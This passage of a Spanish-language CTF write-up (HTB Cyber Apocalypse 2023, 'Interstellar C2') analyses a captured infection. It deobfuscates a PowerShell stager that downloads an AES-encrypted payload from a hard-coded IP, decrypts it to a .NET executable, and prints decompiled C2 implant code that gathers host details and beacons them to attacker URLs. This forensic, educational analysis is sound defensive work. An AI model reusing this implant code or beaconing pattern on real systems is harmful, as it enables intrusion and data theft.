+PS .../Interstellar C2&gt; <span class="code-dark-cyan">"{7}{0}{5}{4}{3}{1}{2}{6}"</span><span class="code-grey">-F</span><span class="code-dark-cyan">'m.'</span><span class="code-grey">,</span><span class="code-dark-cyan">'ph'</span><span class="code-grey">,</span><span class="code-dark-cyan">'Y.ae'</span><span class="code-grey">,</span><span class="code-dark-cyan">'A'</span><span class="code-grey">,</span><span class="code-dark-cyan">'TY.crypTOgR'</span><span class="code-grey">,</span><span class="code-dark-cyan">'SeCuRi'</span><span class="code-grey">,</span><span class="code-dark-cyan">'S'</span><span class="code-grey">,</span><span class="code-dark-cyan">'sYSte'</span>
+sYStem.SeCuRiTY.crypTOgRAphY.aeS
+PS .../Interstellar C2&gt; <span class="code-dark-cyan">"{4}{7}{0}{1}{3}{2}{8}{5}{10}{6}{9}"</span> <span class="code-grey">-f</span> <span class="code-dark-cyan">'TEm.secU'</span><span class="code-grey">,</span><span class="code-dark-cyan">'R'</span><span class="code-grey">,</span><span class="code-dark-cyan">'Y.CrY'</span><span class="code-grey">,</span><span class="code-dark-cyan">'IT'</span><span class="code-grey">,</span><span class="code-dark-cyan">'s'</span><span class="code-grey">,</span><span class="code-dark-cyan">'Y.'</span><span class="code-grey">,</span><span class="code-dark-cyan">'D'</span><span class="code-grey">,</span><span class="code-dark-cyan">'yS'</span><span class="code-grey">,</span><span class="code-dark-cyan">'pTogrAPH'</span><span class="code-grey">,</span><span class="code-dark-cyan">'E'</span><span class="code-grey">,</span><span class="code-dark-cyan">'CrypTOSTReAmmo'</span>
+sySTEm.secURITY.CrYpTogrAPHY.CrypTOSTReAmmoDE
+PS .../Interstellar C2&gt; <span class="code-dark-green">${U`Rl}</span> <span class="code-grey">=</span> <span class="code-white">(<span class="code-dark-cyan">"{0}{4}{1}{5}{8}{6}{2}{7}{9}{3}"</span><span class="code-grey">-f</span> <span class="code-dark-cyan">'htt'</span><span class="code-grey">,</span><span class="code-dark-cyan">'4f0'</span><span class="code-grey">,</span><span class="code-dark-cyan">'53-41ab-938'</span><span class="code-grey">,</span><span class="code-dark-cyan">'d8e51'</span><span class="code-grey">,</span><span class="code-dark-cyan">'p://64.226.84.200/9497'</span><span class="code-grey">,</span><span class="code-dark-cyan">'8'</span><span class="code-grey">,</span><span class="code-dark-cyan">'58'</span><span class="code-grey">,</span><span class="code-dark-cyan">'a-ae1bd8'</span><span class="code-grey">,</span><span class="code-dark-cyan">'-'</span><span class="code-grey">,</span><span class="code-dark-cyan">'6'</span>)</span>  
+PS .../Interstellar C2&gt; <span class="code-dark-green">${U`Rl}</span>
+http://64.226.84.200/94974f08-5853-41ab-938a-ae1bd86d8e51
+PS .../Interstellar C2&gt; <span class="code-dark-cyan">"{4}{6}{2}{9}{1}{10}{0}{5}{8}{3}{7}"</span> <span class="code-grey">-f</span> <span class="code-dark-cyan">'phy.Crypto'</span><span class="code-grey">,</span><span class="code-dark-cyan">'ptogr'</span><span class="code-grey">,</span><span class="code-dark-cyan">'ecuri'</span><span class="code-grey">,</span><span class="code-dark-cyan">'rea'</span><span class="code-grey">,</span><span class="code-dark-cyan">'Syste'</span><span class="code-grey">,</span><span class="code-dark-cyan">'S'</span><span class="code-grey">,</span><span class="code-dark-cyan">'m.S'</span><span class="code-grey">,</span><span class="code-dark-cyan">'m'</span><span class="code-grey">,</span><span class="code-dark-cyan">'t'</span><span class="code-grey">,</span><span class="code-dark-cyan">'ty.Cry'</span><span class="code-grey">,</span><span class="code-dark-cyan">'a'</span>
+System.Security.Cryptography.CryptoStream
+PS .../Interstellar C2&gt; <span class="code-dark-cyan">"{2}{3}{1}{0}"</span> <span class="code-grey">-f</span><span class="code-dark-cyan">'ent'</span><span class="code-grey">,</span><span class="code-dark-cyan">'t-Cont'</span><span class="code-grey">,</span><span class="code-dark-cyan">'S'</span><span class="code-grey">,</span><span class="code-dark-cyan">'e'</span>
+Set-Content
+</code></pre></div><p>Después de un poco de análisis, podemos suponer que el <em>script</em> está haciendo una petición web a <code>/94974f08-5853-41ab-938a-ae1bd86d8e51</code> y descifrando el contenido con AES. De hecho, hay una petición GET a esta URL:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/Interstellar-C2-4.webp" alt="Interstellar C2 4"></p><h3 id="descifrando-el-ejecutable-de-_malware_">Descifrando el ejecutable de <em>malware</em></h3><p>Exporté los datos de respuesta a un archivo llamado <code>payload.bin</code> (usando la opción <code>Export Packet Bytes...</code> desde Wireshark). Usando Python, podemos descifrar el <em>payload</em> con la clave y el IV del <em>script</em> de PowerShell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">payload.bin</span>
+payload.bin: data
+
+<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
+&gt;&gt;&gt; from Crypto.Cipher import AES
+&gt;&gt;&gt;
+&gt;&gt;&gt; key = bytes((0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0))
+&gt;&gt;&gt; iv = bytes((0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1))
+&gt;&gt;&gt;
+&gt;&gt;&gt; cipher = AES.new(key, AES.MODE_CBC, iv)
+&gt;&gt;&gt;
+&gt;&gt;&gt; with open('payload.bin', 'rb') as f:
+...     enc = f.read()
+...
+&gt;&gt;&gt; data = cipher.decrypt(enc)
+&gt;&gt;&gt; data[:20]
+b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00'  
+</code></pre></div><p>De los bytes mágicos, vemos que el <em>payload</em> descifrado es en realidad un Windows PE, así que lo guardamos en un archivo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; with open('malware.exe', 'wb') as f:
+...     f.write(data)
+...
+18960
+&gt;&gt;&gt; exit()
+
+<span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">malware.exe</span>
+malware.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows  
+</code></pre></div><h2 id="descompilación-de-c-net">Descompilación de C# .NET</h2><p>Dado que el archivo ejecutable se compila de C# .NET, podemos descompilarlo y leer el código fuente de C# usando herramientas como JetBrains dotPeek, ILSpy o dnSpu.</p><p>La función <code>Main</code> solamente llama a <code>Sharp</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">void</span><span class="mtk1"> </span><span class="mtk8">Main</span><span class="mtk1">()</span>  
+<span class="mtk1">  {</span>
+<span class="mtk1">    </span><span class="mtk8">Sharp</span><span class="mtk1">(</span><span class="mtk6">0L</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">void</span><span class="mtk1"> </span><span class="mtk8">Sharp</span><span class="mtk1">(</span><span class="mtk5">long</span><span class="mtk1"> baseAddr </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0L</span><span class="mtk1">)</span>
+<span class="mtk1">  {</span>
+<span class="mtk1">    DllBaseAddress </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">IntPtr</span><span class="mtk1">(baseAddr);</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">string.</span><span class="mtk8">IsNullOrEmpty</span><span class="mtk1">(</span><span class="mtk4">""</span><span class="mtk1">) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk1">Environment.UserDomainName.</span><span class="mtk8">ToLower</span><span class="mtk1">().</span><span class="mtk8">Contains</span><span class="mtk1">(</span><span class="mtk4">""</span><span class="mtk1">.</span><span class="mtk8">ToLower</span><span class="mtk1">()))</span>  
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">IntPtr</span><span class="mtk1"> consoleWindow </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">GetConsoleWindow</span><span class="mtk1">();</span>
+<span class="mtk1">    </span><span class="mtk8">ShowWindow</span><span class="mtk1">(consoleWindow, </span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">AUnTrCrts</span><span class="mtk1">();</span>
+<span class="mtk1">    </span><span class="mtk5">int</span><span class="mtk1"> num </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">30</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">int</span><span class="mtk1"> num2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">60000</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">ManualResetEvent</span><span class="mtk1"> manualResetEvent </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">ManualResetEvent</span><span class="mtk1">(initialState: </span><span class="mtk6">false</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> num </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk5">try</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        </span><span class="mtk8">primer</span><span class="mtk1">();</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">      </span><span class="mtk5">catch</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        num</span><span class="mtk5">--</span><span class="mtk1">;</span>
+<span class="mtk1">        manualResetEvent.</span><span class="mtk8">WaitOne</span><span class="mtk1">(num2);</span>
+<span class="mtk1">        num2 </span><span class="mtk5">*=</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">;</span>
+<span class="mtk1">        </span><span class="mtk5">continue</span><span class="mtk1">;</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">IntPtr</span><span class="mtk1"> currentThread </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">GetCurrentThread</span><span class="mtk1">();</span>
+<span class="mtk1">    </span><span class="mtk8">TerminateThread</span><span class="mtk1">(currentThread, </span><span class="mtk6">0u</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+</code></pre></div><p>Y, como se puede ver, <code>Sharp</code> intenta llamar <code>primer</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">void</span><span class="mtk1"> </span><span class="mtk8">primer</span><span class="mtk1">()</span>
+<span class="mtk1">  {</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">(DateTime.</span><span class="mtk8">ParseExact</span><span class="mtk1">(</span><span class="mtk4">"2025-01-01"</span><span class="mtk1">, </span><span class="mtk4">"yyyy-MM-dd"</span><span class="mtk1">, CultureInfo.InvariantCulture) </span><span class="mtk5">&gt;</span><span class="mtk1"> DateTime.Now))</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    dfs </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> text </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">try</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      text </span><span class="mtk5">=</span><span class="mtk1"> WindowsIdentity.</span><span class="mtk8">GetCurrent</span><span class="mtk1">().Name;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">catch</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      text </span><span class="mtk5">=</span><span class="mtk1"> Environment.UserName;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">ihInteg</span><span class="mtk1">())</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      text </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk4">"*"</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> userDomainName </span><span class="mtk5">=</span><span class="mtk1"> Environment.UserDomainName;</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> environmentVariable </span><span class="mtk5">=</span><span class="mtk1"> Environment.</span><span class="mtk8">GetEnvironmentVariable</span><span class="mtk1">(</span><span class="mtk4">"COMPUTERNAME"</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> environmentVariable2 </span><span class="mtk5">=</span><span class="mtk1"> Environment.</span><span class="mtk8">GetEnvironmentVariable</span><span class="mtk1">(</span><span class="mtk4">"PROCESSOR_ARCHITECTURE"</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk5">int</span><span class="mtk1"> id </span><span class="mtk5">=</span><span class="mtk1"> Process.</span><span class="mtk8">GetCurrentProcess</span><span class="mtk1">().Id;</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> processName </span><span class="mtk5">=</span><span class="mtk1"> Process.</span><span class="mtk8">GetCurrentProcess</span><span class="mtk1">().ProcessName;</span>
+<span class="mtk1">    Environment.CurrentDirectory </span><span class="mtk5">=</span><span class="mtk1"> Environment.</span><span class="mtk8">GetEnvironmentVariable</span><span class="mtk1">(</span><span class="mtk4">"windir"</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> text2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> text3 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1">[] array </span><span class="mtk5">=</span><span class="mtk1"> basearray;</span>
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> (</span><span class="mtk5">int</span><span class="mtk1"> i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">&lt;</span><span class="mtk1"> array.Length; dfs</span><span class="mtk5">++</span><span class="mtk1">, i</span><span class="mtk5">++</span><span class="mtk1">)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk5">string</span><span class="mtk1"> text4 </span><span class="mtk5">=</span><span class="mtk1"> array[i];</span>
+<span class="mtk1">      </span><span class="mtk5">string</span><span class="mtk1"> un </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">$"{</span><span class="mtk1">userDomainName</span><span class="mtk4">};{</span><span class="mtk1">text</span><span class="mtk4">};{</span><span class="mtk1">environmentVariable</span><span class="mtk4">};{</span><span class="mtk1">environmentVariable2</span><span class="mtk4">};{</span><span class="mtk1">id</span><span class="mtk4">};{</span><span class="mtk1">processName</span><span class="mtk4">};1"</span><span class="mtk1">;</span>  
+<span class="mtk1">      </span><span class="mtk5">string</span><span class="mtk1"> key </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"DGCzi057IDmHvgTVE2gm60w8quqfpMD+o8qCBGpYItc="</span><span class="mtk1">;</span>
+<span class="mtk1">      text3 </span><span class="mtk5">=</span><span class="mtk1"> text4;</span>
+<span class="mtk1">      </span><span class="mtk5">string</span><span class="mtk1"> address </span><span class="mtk5">=</span><span class="mtk1"> text3 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk4">"/Kettie/Emmie/Anni?Theda=Merrilee?c"</span><span class="mtk1">;</span>
+<span class="mtk1">      </span><span class="mtk5">try</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        </span><span class="mtk5">string</span><span class="mtk1"> enc </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">GetWebRequest</span><span class="mtk1">(</span><span class="mtk8">Encryption</span><span class="mtk1">(key, un)).</span><span class="mtk8">DownloadString</span><span class="mtk1">(address);</span>
+<span class="mtk1">        text2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">Decryption</span><span class="mtk1">(key, enc);</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">      </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk8 mtku">Exception</span><span class="mtk1"> ex)</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        Console.</span><span class="mtk8">WriteLine</span><span class="mtk1">(</span><span class="mtk4">$" &gt; Exception {</span><span class="mtk1">ex</span><span class="mtk4">.</span><span class="mtk1">Message</span><span class="mtk4">}"</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk5">continue</span><span class="mtk1">;</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (string.</span><span class="mtk8">IsNullOrEmpty</span><span class="mtk1">(text2))</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk5">throw</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Exception</span><span class="mtk1">();</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">Regex</span><span class="mtk1"> regex </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Regex</span><span class="mtk1">(</span><span class="mtk4">"RANDOMURI19901(.*)10991IRUMODNAR"</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">Match</span><span class="mtk1"> match </span><span class="mtk5">=</span><span class="mtk1"> regex.</span><span class="mtk8">Match</span><span class="mtk1">(text2);</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> randomURI </span><span class="mtk5">=</span><span class="mtk1"> match.Groups[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ToString</span><span class="mtk1">();</span>
+<span class="mtk1">    regex </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Regex</span><span class="mtk1">(</span><span class="mtk4">"URLS10484390243(.*)34209348401SLRU"</span><span class="mtk1">);</span>
+<span class="mtk1">    match </span><span class="mtk5">=</span><span class="mtk1"> regex.</span><span class="mtk8">Match</span><span class="mtk1">(text2);</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> stringURLS </span><span class="mtk5">=</span><span class="mtk1"> match.Groups[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ToString</span><span class="mtk1">();</span>
+<span class="mtk1">    regex </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Regex</span><span class="mtk1">(</span><span class="mtk4">"KILLDATE1665(.*)5661ETADLLIK"</span><span class="mtk1">);</span>
+<span class="mtk1">    match </span><span class="mtk5">=</span><span class="mtk1"> regex.</span><span class="mtk8">Match</span><span class="mtk1">(text2);</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> killDate </span><span class="mtk5">=</span><span class="mtk1"> match.Groups[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ToString</span><span class="mtk1">();</span>
+<span class="mtk1">    regex </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Regex</span><span class="mtk1">(</span><span class="mtk4">"SLEEP98001(.*)10089PEELS"</span><span class="mtk1">);</span>
+<span class="mtk1">    match </span><span class="mtk5">=</span><span class="mtk1"> regex.</span><span class="mtk8">Match</span><span class="mtk1">(text2);</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> sleep </span><span class="mtk5">=</span><span class="mtk1"> match.Groups[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ToString</span><span class="mtk1">();</span>
+<span class="mtk1">    regex </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Regex</span><span class="mtk1">(</span><span class="mtk4">"JITTER2025(.*)5202RETTIJ"</span><span class="mtk1">);</span>
+<span class="mtk1">    match </span><span class="mtk5">=</span><span class="mtk1"> regex.</span><span class="mtk8">Match</span><span class="mtk1">(text2);</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> jitter </span><span class="mtk5">=</span><span class="mtk1"> match.Groups[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ToString</span><span class="mtk1">();</span>
+<span class="mtk1">    regex </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Regex</span><span class="mtk1">(</span><span class="mtk4">"NEWKEY8839394(.*)4939388YEKWEN"</span><span class="mtk1">);</span>
+<span class="mtk1">    match </span><span class="mtk5">=</span><span class="mtk1"> regex.</span><span class="mtk8">Match</span><span class="mtk1">(text2);</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> key2 </span><span class="mtk5">=</span><span class="mtk1"> match.Groups[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ToString</span><span class="mtk1">();</span>
+<span class="mtk1">    regex </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Regex</span><span class="mtk1">(</span><span class="mtk4">"IMGS19459394(.*)49395491SGMI"</span><span class="mtk1">);</span>
+<span class="mtk1">    match </span><span class="mtk5">=</span><span class="mtk1"> regex.</span><span class="mtk8">Match</span><span class="mtk1">(text2);</span>
+<span class="mtk1">    </span><span class="mtk5">string</span><span class="mtk1"> stringIMGS </span><span class="mtk5">=</span><span class="mtk1"> match.Groups[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">ToString</span><span class="mtk1">();</span>
+<span class="mtk1">    </span><span class="mtk8">ImplantCore</span><span class="mtk1">(text3, randomURI, stringURLS, killDate, sleep, ke</span><span class="mtk1">y2, stringIMGS, jitter);</span>
+<span class="mtk1">  }</span>
+</code></pre></div><p>Esta función recopila información sobre la máquina donde se está ejecutando y la almacena en una variable llamada <code>un</code>. Entonces, tenemos esta parte relevante del código:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">    // ...</span>
+
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> (</span><span class="mtk5">int</span><span class="mtk1"> i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">&lt;</span><span class="mtk1"> array.Length; dfs</span><span class="mtk5">++</span><span class="mtk1">, i</span><span class="mtk5">++</span><span class="mtk1">)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk5">string</span><span class="mtk1"> text4 </span><span class="mtk5">=</span><span class="mtk1"> array[i];</span>
+<span class="mtk1">      </span><span class="mtk5">string</span><span class="mtk1"> un </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">$"{</span><span class="mtk1">userDomainName</span><span class="mtk4">};{</span><span class="mtk1">text</span><span class="mtk4">};{</span><span class="mtk1">environmentVariable</span><span class="mtk4">};{</span><span class="mtk1">environmentVariable2</span><span class="mtk4">};{</span><span class="mtk1">id</span><span class="mtk4">};{</span><span class="mtk1">processName</span><span class="mtk4">};1"</span><span class="mtk1">;</span>  
+<span class="mtk1">      </span><span class="mtk5">string</span><span class="mtk1"> key </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"DGCzi057IDmHvgTVE2gm60w8quqfpMD+o8qCBGpYItc="</span><span class="mtk1">;</span>
+<span class="mtk1">      text3 </span><span class="mtk5">=</span><span class="mtk1"> text4;</span>
+<span class="mtk1">      </span><span class="mtk5">string</span><span class="mtk1"> address </span><span class="mtk5">=</span><span class="mtk1"> text3 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk4">"/Kettie/Emmie/Anni?Theda=Merrilee?c"</span><span class="mtk1">;</span>
+<span class="mtk1">      </span><span class="mtk5">try</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        </span><span class="mtk5">string</span><span class="mtk1"> enc </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">GetWebRequest</span><span class="mtk1">(</span><span class="mtk8">Encryption</span><span class="mtk1">(key, un)).</span><span class="mtk8">DownloadString</span><span class="mtk1">(address);</span>
+<span class="mtk1">        text2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">Decryption</span><span class="mtk1">(key, enc);</span>
+<span class="mtk1">      }</span>
+
+<span class="mtk3">    // ...</span>
+</code></pre></div><p>Nuevamente, está realizando una petición web, esta vez a <code>/Kettie/Emmie/Anni?Theda=Merrilee?c</code>. Y aparece en el archivo PCAP:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/Interstellar-C2-5.webp" alt="Interstellar C2 5"></p><p>Parecen datos codificados en Base64. Por el momento, podemos guardarlo como un archivo llamado <code>kettie.b64</code>.</p><p>En primer lugar, hay una llamada a <code>Encryption</code> con <code>key</code> y <code>un</code> como argumentos:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">string</span><span class="mtk1"> </span><span class="mtk8">Encryption</span><span class="mtk1">(</span><span class="mtk5">string</span><span class="mtk1"> key, </span><span class="mtk5">string</span><span class="mtk1"> un, </span><span class="mtk5">bool</span><span class="mtk1"> comp </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">, </span><span class="mtk5">byte</span><span class="mtk1">[] unByte </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1">)</span>
+<span class="mtk1">  {</span>
+<span class="mtk1">    </span><span class="mtk5">byte</span><span class="mtk1">[] array </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1">;</span>
+<span class="mtk1">    array </span><span class="mtk5">=</span><span class="mtk1"> ((unByte </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">null</span><span class="mtk1">) </span><span class="mtk5">?</span><span class="mtk1"> Encoding.UTF8.</span><span class="mtk8">GetBytes</span><span class="mtk1">(un) </span><span class="mtk5">:</span><span class="mtk1"> unByte);</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (comp)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      array </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">Compress</span><span class="mtk1">(array);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">try</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk8 mtku">SymmetricAlgorithm</span><span class="mtk1"> symmetricAlgorithm </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">CreateCam</span><span class="mtk1">(key, </span><span class="mtk6">null</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk5">byte</span><span class="mtk1">[] second </span><span class="mtk5">=</span><span class="mtk1"> symmetricAlgorithm.</span><span class="mtk8">CreateEncryptor</span><span class="mtk1">().</span><span class="mtk8">TransformFinalBlock</span><span class="mtk1">(array, </span><span class="mtk6">0</span><span class="mtk1">, array.Length);</span>
+<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1"> Convert.</span><span class="mtk8">ToBase64String</span><span class="mtk1">(</span><span class="mtk8">Combine</span><span class="mtk1">(symmetricAlgorithm.IV, second));</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">catch</span>
+<span class="mtk1">    {</span>
